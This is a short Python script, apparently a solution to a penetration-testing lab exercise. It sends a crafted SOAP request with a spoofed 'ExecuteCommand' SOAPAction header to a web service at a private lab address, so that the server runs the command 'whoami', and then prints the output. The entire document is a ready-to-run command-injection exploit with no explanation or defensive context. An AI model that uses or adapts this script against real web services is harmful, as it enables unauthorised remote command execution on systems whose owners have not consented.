import requests

# Define the SOAP payload with the command to be executed
payload = """
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>
"""

# Send the SOAP request to the target URL
response = requests.post(
    "http://10.129.202.133:3002/wsdl",
    data=payload,
    headers={"SOAPAction": '"ExecuteCommand"'}
)

# Print the response content
print(response.content)
